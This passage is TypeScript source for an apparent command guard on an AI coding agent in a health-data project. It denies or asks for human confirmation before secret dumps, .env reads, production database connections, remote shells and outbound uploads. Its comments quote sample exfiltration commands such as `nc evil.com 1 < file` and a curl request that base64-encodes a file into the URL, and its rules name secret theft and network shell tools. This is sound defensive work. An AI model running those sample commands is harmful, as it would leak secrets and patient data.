        remoteRefs.some((r) => r.startsWith("+"));
      if (targetsMain && forced) {
        return deny(
          "Force-pushing main rewrites the change record (see audit/FORCE_PUSH_RECOVERY_AUDIT_2026-09-25.md).",
        );
      }
      if (targetsMain) {
        return ask(
          "Pushing to main auto-deploys and costs a CI matrix run. Confirm the human has approved this push, and that rounds are batched.",
        );
      }
    }
    if (pending) return pending;
  }

  // --- Environment dumps and secret variables echoed into the transcript.
  if (
    /^(printenv|env|set|export|declare)$/.test(prog) &&
    (args.length === 0 || /^(-p|-x)$/.test(args[0] ?? ""))
  ) {
    return deny(
      "Dumping the environment would put DATABASE_URL and vendor secrets into the transcript. Print the one non-secret variable you need, by name.",
    );
  }
  if (/\/proc\/[^\s]*\/environ/.test(seg))
    return deny("Reading a process environment exposes its secrets.");
  if (/^(echo|printf|cat)$/.test(prog) && SECRET_VAR.test(argline)) {
    return deny(
      'Echoing a secret-bearing variable puts it in the transcript. Check presence with `[ -n "$VAR" ] && echo set` instead.',
    );
  }

  // --- docker compose: lifecycle commands may use --env-file; `config` prints resolved secrets.
  const isCompose = prog === "docker-compose" || (prog === "docker" && args[0] === "compose");
  if (isCompose) {
    const sub =
      args.filter(
        (a, k) => !a.startsWith("-") && !/^-/.test(args[k - 1] ?? "") && a !== "compose",
      )[0] ?? "";
    if (/(^|\s)--env-file\b/.test(argline) && !COMPOSE_SAFE.test(sub)) {
      return deny(
        `\`docker compose ${sub}\` with --env-file can print resolved secrets (\`config\` does). Lifecycle commands (up, down, run, exec, logs…) are fine.`,
      );
    }
  }

  // --- Secret files read through the shell (the Read tool is blocked separately).
  if (
    !READ_ONLY_CHECK.test(prog) &&
    !(prog === "git" && /^(status|check-ignore|ls-files|add|rm|mv)$/.test(args[0] ?? ""))
  ) {
    for (const t of fileArgs(args)) {
      if (isCompose && SECRET_BY_NAME.test(t)) continue; // --env-file value for a lifecycle command
      if (globReachesSecret(t)) {
        return deny(
          `\`${t}\` expands onto a live secret file (.env, key material). Name the file you need, and not a secret one.`,
        );
      }
      const byName = SECRET_BY_NAME.test(t);
      const pathLike = t.includes("/") || (ctx.exists?.(t) ?? false);
      if (!byName && !pathLike) continue;
      const why = secretPathReason(t);
      if (why) {
        return deny(
          `\`${t}\` is ${why}. Agents do not read secrets or dumps; use .env.example for shape, and ask the human for any value you truly need.`,
        );
      }
    }
  }

  // --- Inline interpreter code that names a secret file: `python -c "open('.env').read()"`.
  if (runsInlineCode(prog, args) && SECRET_MENTION.test(argline)) {
    return deny(
      "Inline code that opens a live secret file is the same read as `cat`. Agents do not read secrets or dumps.",
    );
  }

  // --- The harness protecting itself: no shell edit of its own guard, ledger or approved lists.
  const protectedHit = writesProtectedPath(prog, args, ctx);
  if (protectedHit) {
    return ask(
      `\`${protectedHit}\` is part of the agent harness or the compliance record. Changing it through the shell skips the edit prompt, so a human approves it here.`,
    );
  }

  // --- Production data access. An agent session connecting to a non-local database is PHI access.
  if (/^(psql|pg_dump|pg_dumpall|pg_restore|pgcli)$/.test(prog)) {
    const hostFlag = /(?:^|\s)(?:-h\s*|--host[=\s])([^\s'"]+)/.exec(argline)?.[1];
    const urlHost = /postgres(?:ql)?:\/\/[^@\s]*@([^/:\s?'"]+)/.exec(argline)?.[1];
    const envHost = assigns.map((a) => /^PGHOST=(.*)$/.exec(a)?.[1]).find(Boolean);
    const host = hostFlag ?? urlHost ?? envHost;
    if (host && !isLocalHost(host)) {
      return deny(
        `Connecting to database host \`${host}\` from an agent session is access to PHI. Agents work against local or private-container databases with synthetic data only.`,
      );
    }
    if (!host && /\$\{?[A-Z_]*DATABASE_URL/.test(argline)) {
      return ask(
        "`$DATABASE_URL` could point anywhere. Confirm it is a local or private-container database with synthetic data.",
      );
    }
  }

  // --- Remote shells: production access must be a human decision every time.
  if (/^(ssh|scp|sftp|rsync)$/.test(prog)) {
    const m =
      /(?:^|\s)(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9.-]+\.[A-Za-z]{2,}|\d{1,3}(?:\.\d{1,3}){3}|[A-Za-z0-9_-]+)(?::|\s|$)/.exec(
        fileArgs(args).find((a) => a.includes("@") || a.includes(":") || prog === "ssh") ?? "",
      );
    const host = m?.[1] ?? "";
    if (host && !isLocalHost(host)) {
      return ask(
        `Remote access to \`${host}\`. Production hosts hold PHI; confirm this is intended and that no PHI will enter the session.`,
      );
    }
  }

  // --- Outbound uploads: the exfiltration shape.
  if (/^(curl|wget|http|https|httpie)$/.test(prog)) {
    const host = /https?:\/\/([^/:\s'"]+)/.exec(argline)?.[1] ?? "";
    const upload =
      /(\s-d\b|\s--data(-[a-z]+)?\b|\s-F\b|\s--form\b|\s-T\b|\s--upload-file\b|\s-X\s*(POST|PUT|PATCH)\b|--post-(data|file))/i.test(
        ` ${argline}`,
      );
    if (!isLocalHost(host)) {
      if (upload) {
        return ask(
          `Sending data to \`${host || "a remote host"}\`. Confirm the payload carries no PHI or secrets.`,
        );
      }
      // A plain GET can still carry data out in its URL or headers: `curl https://x/?d=$(base64 < f)`.
      if (/\$\(|`|\$\{?[A-Za-z_]/.test(seg)) {
        return ask(
          `A request to \`${host || "a remote host"}\` that expands shell values or command output into it can carry PHI or secrets out. Confirm what is sent.`,
        );
      }
    }
  }
  // Raw sockets: nothing in `nc evil.com 1 < file` looks like an upload to the checks above.
  if (/^(nc|ncat|netcat|telnet|socat)$/.test(prog)) {
    const host =
      prog === "socat"
        ? (/(?:TCP|SSL|OPENSSL)[46]?:([^:\s,]+)/i.exec(argline)?.[1] ?? "")
        : (fileArgs(args).find((a) => !/^\d+$/.test(a)) ?? "");
    if (!isLocalHost(host)) {
      return ask(
        `Opening a raw connection to \`${host || "a remote host"}\`. Confirm nothing from the repo or the environment is sent.`,
      );
    }
  }
  if (prog === "openssl" && args[0] === "s_client") {
    const host = /-connect\s+([^:\s]+)/.exec(argline)?.[1] ?? "";
    if (!isLocalHost(host)) {
      return ask(
        `Opening a TLS connection to \`${host || "a remote host"}\`. Confirm what is sent.`,
      );
    }
  }

  // --- Live suites drop cluster roles: they must run against a private container (CLAUDE.md).
  if (
    (prog === "bun" && /^run\s+test:[^\s]*:live\b/.test(argline)) ||
    (/^(vitest|bunx|npx)$/.test(prog) && /\.live\.test/.test(argline))
  ) {
    return ask(
      "Live suites DROP ROLE chartwarden_app. Confirm DATABASE_URL points at a private pgvector/pgvector:pg18 container (own port, fresh database), never the shared Docker cluster.",
    );
  }
  return null;
}
